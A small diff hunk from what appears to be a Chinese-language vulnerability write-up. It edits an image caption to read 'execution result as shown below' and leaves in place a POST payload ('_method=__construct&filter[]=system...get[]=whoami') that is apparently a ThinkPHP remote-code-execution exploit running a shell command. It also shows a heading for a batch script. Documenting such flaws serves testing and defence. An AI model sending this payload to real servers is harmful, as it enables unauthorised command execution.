@@ -26,7 +26,7 @@ POST:
 
 _method=__construct&filter[]=system&method=get&get[]=whoami
 ```
-如下图  
+执行结果如下图  
 ![image](./0.png)
 
 # 0x06 批量脚本
